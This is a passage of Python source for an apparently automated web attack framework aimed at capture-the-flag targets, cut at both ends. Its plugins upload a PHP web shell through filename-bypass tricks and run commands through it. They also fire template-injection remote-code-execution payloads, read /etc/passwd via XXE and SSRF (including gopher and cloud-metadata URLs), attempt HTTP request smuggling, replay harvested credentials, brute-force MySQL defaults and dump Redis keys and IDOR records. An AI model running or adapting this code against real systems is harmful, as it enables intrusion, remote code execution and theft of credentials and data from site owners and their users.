                    log(f"未授权: {path} ({len(body)}B)", "hit")
                    for flag in extract_flags(body):
                        log(f"  FLAG(Auth): {flag}", "hit"); save("flags", flag, ctx["loot"])
        return findings

@register
class InfoLeakPlugin(Plugin):
    name = "info_leak"; vuln_type = "information_disclosure"; severity = Severity.MEDIUM
    def detect(self, ctx):
        findings = []
        url = ctx["url"]; endpoints = ctx["endpoints"]
        for path in ["/.git/HEAD","/.env","/.git/config","/actuator/env","/actuator/heapdump",
                     "/phpinfo.php","/debug","/swagger-ui.html","/api-docs","/robots.txt",
                     "/backup.zip","/db.sql","/dump.sql","/flag.txt","/flag"]:
            if path in endpoints and endpoints[path]["code"]==200:
                body, _, _ = http_get(f"{url}{path}", 3)
                # 提取敏感信息
                creds = re.findall(r"(?i)(password|passwd|secret|key|token)\s*[:=]\s*[\"']?([^\s\"']+)", body)
                for flag in extract_flags(body):
                    log(f"  FLAG(泄露): {flag} @ {path}", "hit"); save("flags", flag, ctx["loot"])
                if creds:
                    for k,v in creds: log(f"  凭证泄露: {k}={v}", "hit"); save("creds", f"{path}: {k}={v}", ctx["loot"])
                findings.append(Finding("info_leak", ctx["target"], url, path, "", Severity.MEDIUM, 0.9, body[:200]))
                log(f"信息泄露: {path}", "hit")
        return findings

@register
class SensitiveFilePlugin(Plugin):
    name = "sensitive_file"; vuln_type = "sensitive_file"; severity = Severity.MEDIUM
    def detect(self, ctx):
        findings = []
        url = ctx["url"]; endpoints = ctx["endpoints"]
        for path, code in endpoints.items():
            if code.get("code")==200 and code.get("size",0)>50:
                if path not in ["/","/login","/search","/admin"]:
                    findings.append(Finding("sensitive_file", ctx["target"], url, path, "", Severity.LOW, 0.5, f"size={code.get('size')}"))
        return findings


@register
class CSRFPlugin(Plugin):
    name = "csrf"; vuln_type = "csrf"; severity = Severity.MEDIUM
    CSRF_TOKENS = ["csrf", "_token", "authenticity_token", "csrfmiddlewaretoken", "__requestverificationtoken"]
    def detect(self, ctx):
        findings = []
        url = ctx["url"]; endpoints = ctx["endpoints"]
        for path in list(endpoints.keys())[:20]:
            body, code, _ = http_get(f"{url}{path}", 3)
            if code != 200: continue
            forms = Crawler.extract_forms(body)
            for form in forms:
                if form["method"] == "POST":
                    has_csrf = any(any(tok in p.lower() for tok in self.CSRF_TOKENS) for p in form["params"])
                    if not has_csrf and len(form["params"]) >= 2:
                        findings.append(Finding("csrf", ctx["target"], url, path, "", Severity.MEDIUM, 0.6, f"params={form['params'][:3]}"))
                        log(f"CSRF: {path} (无token)", "hit"); save("csrf", f"{url}{path}", ctx["loot"])
                        return findings
        return findings

@register
class FrameworkExploitPlugin(Plugin):
    name = "framework_exploit"; vuln_type = "framework_exploit"; severity = Severity.CRITICAL
    def detect(self, ctx):
        findings = []
        url = ctx["url"]
        body, _, _ = http_get(url, 3)
        bl = body.lower()
        if "werkzeug" in bl or "flask" in bl:
            for path in ["/console", "/debug"]:
                body2, code, _ = http_get(f"{url}{path}", 3)
                if code == 200 and "debugger" in body2.lower():
                    findings.append(Finding("framework_exploit", ctx["target"], url, path, "", Severity.CRITICAL, 0.9, "Flask debug console"))
                    log(f"Flask debug console: {path}", "hit"); return findings
        if "spring" in bl or "whitelabel" in bl:
            for path in ["/actuator/env", "/actuator/heapdump", "/actuator/jolokia"]:
                body2, code, _ = http_get(f"{url}{path}", 3)
                if code == 200 and len(body2) > 50:
                    findings.append(Finding("framework_exploit", ctx["target"], url, path, "", Severity.HIGH, 0.8, "Spring Actuator"))
                    log(f"Spring Actuator: {path}", "hit")
                    for flag in extract_flags(body2): save("flags", flag, ctx["loot"])
                    return findings
        if "thinkphp" in bl:
            for path in ["/index.php?s=captcha"]:
                body2, code, _ = http_get(f"{url}{path}", 3)
                if code == 200:
                    findings.append(Finding("framework_exploit", ctx["target"], url, path, "", Severity.HIGH, 0.6, "ThinkPHP"))
                    log(f"ThinkPHP: {path}", "hit"); return findings
        return findings

@register
class HostHeaderPlugin(Plugin):
    name = "host_header"; vuln_type = "host_header_injection"; severity = Severity.MEDIUM
    def detect(self, ctx):
        findings = []
        url = ctx["url"]
        for host_val in ["evil.com", "localhost"]:
            body, _, _ = http_req("GET", url, headers={"Host": host_val})
            if host_val in body:
                findings.append(Finding("host_header", ctx["target"], url, "", "", Severity.MEDIUM, 0.5, f"Host={host_val}"))
                log(f"Host头注入: {host_val}", "hit"); return findings
        return findings

@register
class XXEPlugin(Plugin):
    name = "xxe"; vuln_type = "xxe"; severity = Severity.CRITICAL
    def detect(self, ctx):
        findings = []
        url = ctx["url"]; endpoints = ctx["endpoints"]
        xxe_payload = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
        for path in list(endpoints.keys())[:30]:
            if any(k in path.lower() for k in ["api","upload","import","parse","xml","soap","feed","rss"]):
                body, code, _ = http_req("POST", f"{url}{path}", data=xxe_payload,
                                         headers={"Content-Type":"application/xml"})
                if "root:" in body:
                    findings.append(Finding("xxe", ctx["target"], url, path, "", Severity.CRITICAL, 0.95, body[:200]))
                    log(f"XXE: {path}", "hit")
                    for flag in extract_flags(body): log(f"  FLAG(XXE): {flag}", "hit"); save("flags", flag, ctx["loot"])
                    return findings
        # blind XXE via forms
        for form in ctx["crawl"].get("forms",[]):
            if form["method"] == "POST":
                body, code, _ = http_req("POST", f"{url}{form['action']}", data=xxe_payload,
                                         headers={"Content-Type":"application/xml"})
                if "root:" in body:
                    findings.append(Finding("xxe", ctx["target"], url, form["action"], "", Severity.CRITICAL, 0.9, body[:200]))
                    log(f"XXE(form): {form['action']}", "hit"); return findings
        return findings

@register
class RaceConditionPlugin(Plugin):
    name = "race"; vuln_type = "race_condition"; severity = Severity.HIGH
    def detect(self, ctx):
        findings = []
        url = ctx["url"]; endpoints = ctx["endpoints"]
        # find redeem/transfer/balance endpoints
        race_paths = [p for p in endpoints if any(k in p.lower() for k in
                      ["redeem","transfer","withdraw","coupon","gift","buy","order","vote","claim","use"])]
        for path in race_paths:
            # send 10 concurrent requests
            bodies = []
            from concurrent.futures import ThreadPoolExecutor, as_completed
            def hit():
                return http_post(f"{url}{path}", {"amount":"1","id":"1"}, 3)
            with ThreadPoolExecutor(max_workers=10) as pool:
                futures = [pool.submit(hit) for _ in range(10)]
                for fut in as_completed(futures):
                    b, c, _ = fut.result()
                    if c == 200: bodies.append(b)
            if len(bodies) >= 8:
                # check if multiple succeeded (should be limited)
                success = sum(1 for b in bodies if "error" not in b.lower()[:100] and len(b) > 20)
                if success >= 8:
                    findings.append(Finding("race", ctx["target"], url, path, "", Severity.HIGH, 0.7, f"{success}/10 success"))
                    log(f"Race: {path} ({success}/10)", "hit")
        return findings

@register
class WAFDetectPlugin(Plugin):
    name = "waf_detect"; vuln_type = "waf"; severity = Severity.INFO
    WAF_SIGS = {
        "cloudflare": ["cf-ray","__cfduid","cloudflare"],
        "akamai": ["akamai","x-akamai"],
        "imperva": ["x-cdn","incapsula","imperva"],
        "aws_waf": ["x-amzn-requestid","awselb"],
        "modsecurity": ["mod_security","modsecurity","NOYB"],
        "barracuda": ["barra","barracuda"],
        "f5_bigip": ["bigipserver","f5-"],
        "safeLine": ["safeLine","chaitin"],
        "openresty": ["openresty"],
        "yunjiasu": ["yunjiasu","__jsluid"],
        "waf": ["x-powered-by-360wzb","x-safe-firewall"],
    }
    def detect(self, ctx):
        url = ctx["url"]
        _, _, headers = http_get(url, 3)
        hdr_str = " ".join(f"{k}:{v}" for k,v in headers.items()).lower()
        detected = []
        for waf, sigs in self.WAF_SIGS.items():
            if any(s in hdr_str for s in sigs):
                detected.append(waf)
        # probe with attack payload to trigger WAF response
        body, code, _ = http_get(f"{url}/?id=<script>alert(1)</script>", 3)
        if code in (403,406,419,429,503):
            body_lower = body.lower()
            for waf, sigs in self.WAF_SIGS.items():
                if any(s in body_lower for s in sigs): detected.append(waf)
            if not detected and code == 403:
                detected.append("unknown-403")
        if detected:
            save("waf", json.dumps(detected), ctx["loot"])
            log(f"WAF: {', '.join(set(detected))}", "hit")
        return []

@register
class SubdomainEnumPlugin(Plugin):
    name = "subdomain"; vuln_type = "subdomain"; severity = Severity.INFO
    def match(self, ctx): return "." in ctx["target"] and not ctx["target"][0].isdigit()
    def detect(self, ctx):
        domain = ctx["target"]
        # strip subdomain to get base
        parts = domain.split(".")
        base = ".".join(parts[-2:]) if len(parts) >= 2 else domain
        subs = set()
        # DNS brute common subdomains
        common = ["www","mail","ftp","admin","test","dev","staging","api","beta","vpn",
                   "portal","sso","auth","oa","erp","crm","hr","finance","git","jenkins",
                   "ci","cd","docker","k8s","grafana","prometheus","kibana","elastic",
                   "redis","mysql","mongo","db","backup","old","new","app","mobile",
                   "m","wap","cdn","static","img","images","media","video","docs",
                   "help","support","blog","forum","bbs","shop","store","pay","wx","weixin"]
        import socket
        for sub in common:
            try:
                hostname = f"{sub}.{base}"
                ip = socket.gethostbyname(hostname)
                subs.add(f"{hostname} -> {ip}")
                log(f"  Sub: {hostname} -> {ip}")
            except: pass
        if subs:
            save("subdomains", "\n".join(sorted(subs)), ctx["loot"])
            log(f"子域名: {len(subs)} 个")
        return []

@register
class CredentialRelayPlugin(Plugin):
    name = "cred_relay"; vuln_type = "credential_reuse"; severity = Severity.HIGH
    def detect(self, ctx):
        findings = []
        url = ctx["url"]
        # read found credentials from loot
        cred_files = [f"{ctx['loot']}/creds.txt", f"{TK}/loot/creds.txt"]
        creds = set()
        for cf in cred_files:
            if os.path.exists(cf):
                for line in open(cf):
                    # extract user:pass patterns
                    for m in re.finditer(r"(\w+):(\S+)", line):
                        creds.add((m.group(1), m.group(2)))
        if not creds: return findings
        # try on login endpoints
        login_paths = ["/login","/admin/login","/api/login","/api/auth/login","/user/login",
                       "/api/v1/auth/login","/auth/signin","/signin","/api/token"]
        for path in login_paths:
            for user, pwd in list(creds)[:10]:
                body, code, _ = http_post(f"{url}{path}", {"username":user,"password":pwd,"user":user,"pass":pwd}, 3)
                if code == 200 and len(body) > 50:
                    if any(k in body.lower() for k in ["token","session","welcome","dashboard","success","profile"]):
                        if "invalid" not in body.lower() and "fail" not in body.lower():
                            findings.append(Finding("cred_relay", ctx["target"], url, path, user, Severity.HIGH, 0.8, f"{user}:***"))
                            log(f"Cred Reuse: {path} {user}:***", "hit")
                            save("cred_reuse", f"{url}{path} {user}:{pwd}", ctx["loot"])
                            return findings
        return findings

@register
class SSRFBlindPlugin(Plugin):
    name = "ssrf_blind"; vuln_type = "ssrf_blind"; severity = Severity.HIGH
    def detect(self, ctx):
        findings = []
        url = ctx["url"]; paths = ctx["cats"].get("ssrf",[])
        params = ["url","uri","u","next","redirect","target","dest","callback","webhook",
                   "image","file","path","src","feed","proxy","fetch","load","include"]
        # use dnslog-style canary
        canary = f"http://{int(time.time())}.burpcollaborator.net"
        for path in paths:
            for param in params:
                body, code, _ = http_get(f"{url}{path}?{param}={ue(canary)}", 3)
                # even if no response, the attempt is logged for OOB detection
                if code and code not in (0, 403, 404):
                    findings.append(Finding("ssrf_blind", ctx["target"], url, path, param, Severity.HIGH, 0.5, f"canary={canary}"))
                    log(f"SSRF(blind): {path}?{param}", "hit")
        return findings

@register
class IDORAdvancedPlugin(Plugin):
    name = "idor_adv"; vuln_type = "idor"; severity = Severity.HIGH
    def detect(self, ctx):
        findings = []
        url = ctx["url"]; endpoints = ctx["endpoints"]
        # find numeric endpoints
        for path in endpoints:
            # /api/user/1, /order/123, etc
            m = re.search(r"(/(?:api/)?(?:user|order|profile|member|account|document|file|item|product|message)/)(\d+)", path)
            if m:
                base, num = m.group(1), int(m.group(2))
                # compare different IDs
                b1, c1, _ = http_get(f"{url}{base}{num}", 3)
                b2, c2, _ = http_get(f"{url}{base}{num+1}", 3)
                if c1 == 200 and c2 == 200 and len(b1) > 50 and len(b2) > 50 and b1 != b2:
                    # check for sensitive data
                    combined = (b1 + b2).lower()
                    if any(k in combined for k in ["email","phone","token","secret","password","ssn","credit","balance"]):
                        findings.append(Finding("idor_adv", ctx["target"], url, base, "", Severity.HIGH, 0.85, f"IDs {num},{num+1} differ"))
                        log(f"IDOR: {base}{{n}}", "hit")
                        # dump first 10
                        for uid in range(num, min(num+10, 100)):
                            body, code, _ = http_get(f"{url}{base}{uid}", 2)
                            if code == 200 and len(body) > 50:
                                save("idor_dump", f"=== {uid} ===\n{body[:500]}", ctx["loot"])
                                for flag in extract_flags(body):
                                    log(f"  FLAG(IDOR): {flag}", "hit"); save("flags", flag, ctx["loot"])
                        return findings
        return findings

@register
class GraphQLAdvancedPlugin(Plugin):
    name = "graphql_adv"; vuln_type = "graphql"; severity = Severity.HIGH
    def detect(self, ctx):
        findings = []
        url = ctx["url"]
        # probe common graphql paths
        gql_paths = ["/graphql","/api/graphql","/gql","/graphiql","/playground",
                     "/v1/graphql","/v2/graphql","/query","/api/query"]
        for path in gql_paths:
            body, code, _ = http_post(f"{url}{path}", {"query":"{ __typename }"})
            if code == 200 and "__typename" in body:
                findings.append(Finding("graphql_adv", ctx["target"], url, path, "", Severity.HIGH, 0.9, body[:100]))
                log(f"GraphQL: {path}", "hit")
                # introspection
                schema_q = '{"query":"{ __schema { queryType { fields { name args { name type { name } } } } mutationType { fields { name } } } }"}'
                sbody, scode, _ = http_req("POST", f"{url}{path}", data=schema_q,
                                           headers={"Content-Type":"application/json"})
                if scode == 200 and "__schema" in sbody:
                    save("graphql_schema", sbody[:5000], ctx["loot"])
                    log(f"  GraphQL introspection OK", "hit")
                    # extract field names for targeted queries
                    fields = re.findall(r'"name":"(\w+)"', sbody)
                    for field_name in fields:
                        if field_name.lower() in ("flag","secret","user","admin","config","password","token"):
                            for q in [f'{{ {field_name} }}', f'{{ {field_name} {{ id }} }}']:
                                b, _, _ = http_post(f"{url}{path}", {"query": q})
                                if b and "error" not in b.lower()[:50]:
                                    save("graphql_data", f"{field_name}: {b[:1000]}", ctx["loot"])
                                    for flag in extract_flags(b):
                                        log(f"  FLAG(GQL): {flag}", "hit"); save("flags", flag, ctx["loot"])
                return findings
        return findings

@register
class DeserializationPlugin(Plugin):
    name = "deserialization"; vuln_type = "deserialization"; severity = Severity.CRITICAL
    PATTERNS = {
        "php": re.compile(r'O:\d+:|a:\d+:|s:\d+:'),
        "java": re.compile(r'rO0AB[A-Za-z0-9+/]'),
        "python": re.compile(r'gASV[A-Za-z0-9+/]'),
        "node": re.compile(r'_\$\$ND_FUNC\$\$_'),
        "dotnet": re.compile(r'AAEAAAD/////'),
        "ruby": re.compile(r'BAhJ[0-9A-Za-z+/]'),
    }
    def detect(self, ctx):
        findings = []
        url = ctx["url"]; endpoints = ctx["endpoints"]
        # check cookies too
        _, _, headers = http_get(url, 3)
        cookie = headers.get("Set-Cookie", "")
        for lang, pat in self.PATTERNS.items():
            if pat.search(cookie):
                findings.append(Finding("deserialization", ctx["target"], url, "", "cookie", Severity.CRITICAL, 0.85, f"lang={lang} in cookie"))
                log(f"反序列化({lang}): cookie", "hit"); save("deserialization", f"{lang}: cookie @ {url}", ctx["loot"])
        # check endpoints
        for path in list(endpoints.keys())[:30]:
            body, _, _ = http_get(f"{url}{path}", 3)
            for lang, pat in self.PATTERNS.items():
                if pat.search(body):
                    findings.append(Finding("deserialization", ctx["target"], url, path, "", Severity.CRITICAL, 0.8, f"lang={lang}"))
                    log(f"反序列化({lang}): {path}", "hit"); save("deserialization", f"{lang}: {url}{path}", ctx["loot"])
                    return findings
        return findings

@register
class NoSQLiPlugin(Plugin):
    name = "nosqli"; vuln_type = "nosql_injection"; severity = Severity.HIGH
    def detect(self, ctx):
        findings = []
        url = ctx["url"]; paths = ctx["cats"].get("sqli", []) + ctx["cats"].get("login", [])
        params = ["user", "username", "email", "login", "pass", "password"]
        for path in paths:
            for param in params:
                for payload, label in [
                    ({"username": {"$ne": ""}, "password": {"$ne": ""}}, "ne bypass"),
                    ({"username": {"$gt": ""}, "password": {"$gt": ""}}, "gt bypass"),
                    ({"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}, "regex bypass"),
                ]:
                    body, code, _ = http_post(f"{url}{path}", payload)
                    if code == 200 and len(body) > 100 and "error" not in body.lower()[:100]:
                        if "invalid" not in body.lower() and "fail" not in body.lower():
                            findings.append(Finding("nosqli", ctx["target"], url, path, param, Severity.HIGH, 0.7, label))
                            log(f"NoSQLi({label}): {path} {param}", "hit"); save("nosqli", f"{label}: {url}{path}", ctx["loot"])
                            return findings
        return findings

@register
class CRLFInjectionPlugin(Plugin):
    name = "crlf"; vuln_type = "crlf_injection"; severity = Severity.MEDIUM
    def detect(self, ctx):
        findings = []
        url = ctx["url"]; endpoints = ctx["endpoints"]
        for path in list(endpoints.keys())[:20]:
            for payload in ["%0d%0aInjected-Header:test123", "%0aInjected-Header:test123", "\r\nInjected-Header:test123"]:
                _, _, headers = http_get(f"{url}{path}?url={ue(payload)}", 3)
                if "Injected-Header" in str(headers):
                    findings.append(Finding("crlf", ctx["target"], url, path, "", Severity.MEDIUM, 0.8, f"payload={payload[:30]}"))
                    log(f"CRLF注入: {path}", "hit")
                    return findings
        return findings

@register
class HTTPSmugglingPlugin(Plugin):
    name = "smuggling"; vuln_type = "http_smuggling"; severity = Severity.CRITICAL
    def detect(self, ctx):
        findings = []
        url = ctx["url"]
        # CL.TE smuggling
        smuggle_body = "0\r\n\r\nSMUGGLED"
        try:
            import http.client
            from urllib.parse import urlparse as up
            parsed = up(url)
            conn_class = http.client.HTTPSConnection if parsed.scheme=="https" else http.client.HTTPConnection
            port = parsed.port or (443 if parsed.scheme=="https" else 80)
            conn = conn_class(parsed.hostname, port, timeout=5)
            headers = {"Transfer-Encoding":"chunked", "Content-Length": str(len(smuggle_body)+5)}
            conn.request("POST", parsed.path or "/", body=smuggle_body, headers=headers)
            resp = conn.getresponse()
            body = resp.read().decode(errors="ignore")
            if resp.status in (200, 201, 301, 302, 400, 500):
                # send second request to check if smuggling worked
                conn2 = conn_class(parsed.hostname, port, timeout=5)
                conn2.request("GET", parsed.path or "/", headers={"User-Agent":"Mozilla/5.0"})
                resp2 = conn2.getresponse()
                body2 = resp2.read().decode(errors="ignore")
                if "SMUGGLED" in body2:
                    findings.append(Finding("smuggling", ctx["target"], url, "", "", Severity.CRITICAL, 0.9, "CL.TE"))
                    log(f"HTTP走私: CL.TE", "hit")
            conn.close()
        except: pass
        return findings

@register
class SSRFProtocolPlugin(Plugin):
    name = "ssrf_proto"; vuln_type = "ssrf_protocol"; severity = Severity.HIGH
    def detect(self, ctx):
        findings = []
        url = ctx["url"]; paths = ctx["cats"].get("ssrf",[])
        params = ["url","uri","u","next","redirect","target","dest","callback","webhook","image","file","path","src"]
        # test multiple protocols
        for proto, payload, indicator in [
            ("gopher", "gopher://127.0.0.1:6379/_INFO%20server", "redis_version"),
            ("dict", "dict://127.0.0.1:6379/INFO", "redis_version"),
            ("file", "file:///etc/passwd", "root:"),
            ("file_flag", "file:///flag", "flag{"),
            ("http_internal", "http://127.0.0.1:80/", "200"),
            ("http_aws", "http://169.254.169.254/latest/meta-data/", "ami-id"),
        ]:
            for path in paths:
                for param in params:
                    body, code, _ = http_get(f"{url}{path}?{param}={ue(payload)}", 5)
                    if indicator in body.lower():
                        findings.append(Finding("ssrf_proto", ctx["target"], url, path, param, Severity.HIGH, 0.85, f"proto={proto}"))
                        log(f"SSRF({proto}): {path}?{param}", "hit")
                        for flag in extract_flags(body):
                            log(f"  FLAG(SSRF): {flag}", "hit"); save("flags", flag, ctx["loot"])
                        return findings
        return findings

@register
class UploadBypassPlugin(Plugin):
    name = "upload_bypass"; vuln_type = "upload_bypass"; severity = Severity.HIGH
    def detect(self, ctx):
        findings = []
        url = ctx["url"]; paths = ctx["cats"].get("upload",[])
        shell = '<?php system($_GET["cmd"]);?>'
        bypass_names = [
            "shell.php.jpg", "shell.php.png", "shell.pHp", "shell.php5", "shell.phtml",
            "shell.php%00.jpg", "shell.php.", "shell.php;.jpg", "shell.php%20",
            "shell.php%0a", "shell.p*hp", "shell.php.jpg.php",
        ]
        for path in paths:
            body, code, _ = http_get(f"{url}{path}", 3)
            if code != 200: continue
            for fname in bypass_names:
                try:
                    import http.client
                    from urllib.parse import urlparse as up
                    parsed = up(f"{url}{path}")
                    conn_class = http.client.HTTPSConnection if parsed.scheme=="https" else http.client.HTTPConnection
                    port = parsed.port or (443 if parsed.scheme=="https" else 80)
                    conn = conn_class(parsed.hostname, port, timeout=5)
                    boundary = "----CTFBoundary"
                    body_data = f"--{boundary}\r\nContent-Disposition: form-data; name=\"file\"; filename=\"{fname}\"\r\nContent-Type: image/jpeg\r\n\r\n{shell}\r\n--{boundary}--\r\n"
                    conn.request("POST", parsed.path, body=body_data, headers={"Content-Type":f"multipart/form-data; boundary={boundary}"})
                    resp = conn.getresponse(); resp.read()
                    if resp.status in (200,201):
                        # try to access uploaded file
                        for guess_dir in ["/uploads/","/upload/","/files/","/static/uploads/","/assets/","/media/","/tmp/"]:
                            base_name = fname.split(".")[0]
                            for ext in [".php",".phtml",".php5",".php.jpg"]:
                                guess = f"{guess_dir}{base_name}{ext}"
                                sbody, scode, _ = http_get(f"{url}{guess}?cmd=id", 3)
                                if scode==200 and "uid=" in sbody:
                                    findings.append(Finding("upload_bypass", ctx["target"], url, path, fname, Severity.CRITICAL, 0.95, f"bypass={fname}"))
                                    log(f"上传绕过: {fname} -> {guess}", "hit")
                                    save("webshells", f"{url}{guess}", ctx["loot"])
                                    for cmd in ["cat /flag","cat /flag.txt","env"]:
                                        out, _, _ = http_get(f"{url}{guess}?cmd={ue(cmd)}")
                                        for flag in extract_flags(out):
                                            log(f"  FLAG(Upload): {flag}", "hit"); save("flags", flag, ctx["loot"])
                                    return findings
                    conn.close()
                except: pass
        return findings

@register
class SSTIAdvancedPlugin(Plugin):
    name = "ssti_adv"; vuln_type = "ssti_advanced"; severity = Severity.CRITICAL
    def detect(self, ctx):
        findings = []
        url = ctx["url"]; paths = ctx["cats"].get("ssti",[])
        params = ["name","template","view","page","content","input","title","text","search"]
        # test more template engines
        for path in paths:
            for param in params:
                for payload, expected, engine in [
                    ("{{7*7}}", "49", "Jinja2/Mako"),
                    ("${7*7}", "49", "Freemarker/Velocity/Ognl"),
                    ("#{7*7}", "49", "Thymeleaf"),
                    ("*{7*7}", "49", "SpringEL"),
                    ("{{7*'7'}}", "7777777", "Jinja2"),
                    ("<%= 7*7 %>", "49", "ERB"),
                    ("{{=7*7}}", "49", "EJS"),
                    ("@(7*7)", "49", "Razor"),
                    ("#{7*7}", "49", "Slim"),
                ]:
                    body, _, _ = http_get(f"{url}{path}?{param}={ue(payload)}", 3)
                    body2, _, _ = http_post(f"{url}{path}", {param: payload}, 3)
                    for b in [body, body2]:
                        if expected in b:
                            findings.append(Finding("ssti_adv", ctx["target"], url, path, param, Severity.CRITICAL, 0.95, f"engine={engine}"))
                            log(f"SSTI({engine}): {path}?{param}={payload}", "hit")
                            # try RCE
                            rce_payloads = [
                                ("{{config.__class__.__init__.__globals__['os'].popen('CMD').read()}}", "Jinja2"),
                                ("{{lipsum.__globals__['os'].popen('CMD').read()}}", "Jinja2"),
                                ("{{cycler.__init__.__globals__.os.popen('CMD').read()}}", "Jinja2"),
                                ("${T(java.lang.Runtime).getRuntime().exec('CMD')}", "Freemarker"),
                            ]
                            for rce_tpl, eng in rce_payloads:
                                for cmd in ["id","cat /flag","cat /flag.txt"]:
                                    rce = rce_tpl.replace("CMD", cmd)
                                    rb, _, _ = http_get(f"{url}{path}?{param}={ue(rce)}", 5)
                                    if "uid=" in rb or "flag" in rb.lower():
                                        log(f"  RCE({eng}): {cmd}", "hit")
                                        save("ssti_rce", f"{cmd}: {strip_html(rb)[:500]}", ctx["loot"])
                                        for flag in extract_flags(rb):
                                            log(f"  FLAG(SSTI): {flag}", "hit"); save("flags", flag, ctx["loot"])
                                        return findings
                            return findings
        return findings

@register
class JSMinerPlugin(Plugin):
    name = "js_miner"; vuln_type = "js_secrets"; severity = Severity.MEDIUM
    def detect(self, ctx):
        findings = []
        url = ctx["url"]; endpoints = ctx["endpoints"]
        # find JS files
        js_paths = [p for p in endpoints if p.endswith((".js",".jsx",".ts",".vue",".map"))]
        for path in list(js_paths)[:15]:
            body, code, _ = http_get(f"{url}{path}", 3)
            if code != 200 or len(body) < 50: continue
            # search for secrets in JS
            patterns = {
                "api_key": r"(?:api[_-]?key|apikey)\s*[:=]\s*['\"]([^'\"]{8,})['\"]",
                "secret": r"(?:secret|password|passwd|token)\s*[:=]\s*['\"]([^'\"]{6,})['\"]",
                "aws_key": r"AKIA[0-9A-Z]{16}",
                "private_key": r"-----BEGIN (?:RSA |EC )?PRIVATE KEY-----",
                "jwt_secret": r"(?:jwt[_-]?secret|signing[_-]?key)\s*[:=]\s*['\"]([^'\"]{8,})['\"]",
                "internal_url": r"https?://(?:10\.\d+\.\d+\.\d+|172\.(?:1[6-9]|2\d|3[01])\.\d+\.\d+|192\.168\.\d+\.\d+)(?::\d+)?(?:/[^\s'\"<>]*)?",
                "hardcoded_creds": r"(?:username|user|login)\s*[:=]\s*['\"]([^'\"]{3,})['\"].*?(?:password|pass|pwd)\s*[:=]\s*['\"]([^'\"]{3,})['\"]",
            }
            for name, pat in patterns.items():
                for m in re.finditer(pat, body, re.I):
                    val = m.group(0)[:100]
                    findings.append(Finding("js_miner", ctx["target"], url, path, name, Severity.MEDIUM, 0.7, val))
                    log(f"JS密钥({name}): {path}", "hit")
                    save("js_secrets", f"{path}: {val}", ctx["loot"])
                    break
            # check for source maps
            map_url = f"{url}{path}.map"
            b2, c2, _ = http_get(map_url, 3)
            if c2 == 200 and "sources" in b2:
                findings.append(Finding("js_miner", ctx["target"], url, path+".map", "", Severity.MEDIUM, 0.8, "source map exposed"))
                log(f"JS源码泄露: {path}.map", "hit")
                save("js_sourcemap", f"{path}.map", ctx["loot"])
        return findings

@register
class BackupFilePlugin(Plugin):
    name = "backup_file"; vuln_type = "backup_file"; severity = Severity.HIGH
    def detect(self, ctx):
        findings = []
        url = ctx["url"]
        # common backup file patterns
        backup_patterns = [
            "/backup.zip", "/www.zip", "/web.zip", "/site.zip", "/wwwroot.zip",
            "/backup.tar.gz", "/www.tar.gz", "/db.sql", "/dump.sql", "/database.sql",
            "/backup.bak", "/index.php.bak", "/index.php~", "/.git/config",
            "/.svn/entries", "/.svn/wc.db", "/WEB-INF/web.xml",
            "/wp-config.php.bak", "/config.php.bak", "/config.inc.php.bak",
            "/application.yml.bak", "/application.properties.bak",
            "/.DS_Store", "/Thumbs.db", "/web.config.bak",
            "/database.sqlite", "/db.sqlite3", "/data.db",
        ]
        for path in backup_patterns:
            body, code, _ = http_get(f"{url}{path}", 3)
            if code == 200 and len(body) > 50:
                # verify it's not a generic error page
                if not any(k in body.lower() for k in ["not found","404","error page","page not found"]):
                    sev = Severity.HIGH if any(k in path for k in [".sql",".zip",".tar",".bak","config","database",".db",".svn",".git"]) else Severity.MEDIUM
                    findings.append(Finding("backup_file", ctx["target"], url, path, "", sev, 0.8, f"size={len(body)}"))
                    log(f"备份文件: {path} ({len(body)}B)", "hit")
                    # extract creds from backup files
                    creds = re.findall(r"(?i)(password|passwd|secret|key|token)\s*[:=]\s*[\"']?([^\s\"']+)", body)
                    for k,v in creds:
                        log(f"  凭证: {k}={v}", "hit"); save("creds", f"{path}: {k}={v}", ctx["loot"])
                    for flag in extract_flags(body):
                        log(f"  FLAG(备份): {flag}", "hit"); save("flags", flag, ctx["loot"])
        return findings

@register
class CORSSensitivePlugin(Plugin):
    name = "cors_sensitive"; vuln_type = "cors_sensitive"; severity = Severity.HIGH
    def detect(self, ctx):
        findings = []
        url = ctx["url"]
        # test with various origins
        for origin in ["http://evil.com", "null", "https://evil.com"]:
            _, _, headers = http_req("GET", url, headers={"Origin": origin})
            acao = headers.get("Access-Control-Allow-Origin","")
            acac = headers.get("Access-Control-Allow-Credentials","")
            if origin in acao or (origin == "null" and acao == "null"):
                sev = Severity.HIGH if acac.lower()=="true" else Severity.MEDIUM
                findings.append(Finding("cors_sensitive", ctx["target"], url, "", "", sev, 0.9, f"origin={origin} ACAO={acao} ACAC={acac}"))
                log(f"CORS: origin={origin} ACAO={acao} ACAC={acac}", "hit")
                # test if we can access sensitive endpoints with this origin
                for api_path in ["/api/user","/api/me","/api/profile","/api/config","/api/admin"]:
                    _, _, h2 = http_req("GET", f"{url}{api_path}", headers={"Origin": origin})
                    if "Access-Control-Allow-Origin" in str(h2):
                        log(f"  CORS敏感接口: {api_path}", "hit")
                        save("cors_sensitive", f"{url}{api_path} origin={origin}", ctx["loot"])
                return findings
        return findings

# ═══════════════════════════════════════════════
# 服务利用
# ═══════════════════════════════════════════════
class SvcExploit:
    @staticmethod
    def redis(target, port, loot):
        out, _, _ = sh(f"redis-cli -h {target} -p {port} INFO server", 5)
        if "redis_version" not in out: return
        log(f"Redis未授权: {target}:{port}", "hit")
        # 搜索flag
        keys, _, _ = sh(f"redis-cli -h {target} -p {port} KEYS '*' 2>/dev/null", 5)
        for key in keys.strip().split("\n"):
            key = key.strip().strip('"')
            if not key: continue
            for cmd in ["GET","HGETALL","LRANGE 0 -1","SMEMBERS","ZRANGE 0 -1"]:
                val, _, _ = sh(f"redis-cli -h {target} -p {port} {cmd} '{key}' 2>/dev/null", 5)
                if "flag" in val.lower():
                    log(f"  Redis flag: {key} = {val.strip()}", "hit"); save("flags", val.strip(), loot)

    @staticmethod
    def mysql(target, port, loot):
        for user in ["root","mysql","admin"]:
            for pwd in ["","root","mysql","admin","123456","password","toor"]:
                out, _, rc = sh(f"mysql -h {target} -P {port} -u {user} -p'{pwd}' -e 'SELECT 1' 2>&1", 5)
                if rc==0:
